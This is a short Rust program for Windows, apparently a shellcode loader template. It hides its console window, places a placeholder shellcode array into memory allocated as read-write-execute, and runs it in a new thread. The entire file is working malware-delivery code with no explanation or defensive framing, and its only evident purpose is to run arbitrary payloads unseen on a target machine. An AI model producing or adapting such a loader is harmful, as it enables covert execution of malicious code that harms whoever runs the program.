#![windows_subsystem = "windows"]

use std::mem;
use std::ptr;

use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::libloaderapi::GetModuleHandleA;
use winapi::um::winuser::ShowWindow;
use winapi::um::wincon::GetConsoleWindow;
use winapi::um::winbase::INFINITE;

fn main() {
    // Hide console window
    hide_console_window();

    // Replace this with your actual shellcode
    let shellcode: &[u8] = &[SHELLCODE_HERE];


    execute_shellcode(&shellcode);
}

fn hide_console_window() {
    unsafe {
        let console_window = GetConsoleWindow();
        if !console_window.is_null() {
            ShowWindow(console_window, winapi::um::winuser::SW_HIDE);
        }
    }
}

fn execute_shellcode(shellcode: &[u8]) {
    unsafe {
        // Allocate memory with READ, WRITE, EXECUTE permissions
        let memory = VirtualAlloc(
            ptr::null_mut(),
            shellcode.len(),
            winapi::um::winnt::MEM_COMMIT | winapi::um::winnt::MEM_RESERVE,
            winapi::um::winnt::PAGE_EXECUTE_READWRITE,
        );

        if memory.is_null() {
            return;
        }

        // Copy shellcode to allocated memory
        ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            memory as *mut u8,
            shellcode.len(),
        );

        // Create thread to execute the shellcode
        let thread = CreateThread(
            ptr::null_mut(),
            0,
            Some(mem::transmute(memory)),
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        );

        if !thread.is_null() {
            // Wait for the thread to complete
            WaitForSingleObject(thread, INFINITE);
        }
    }
}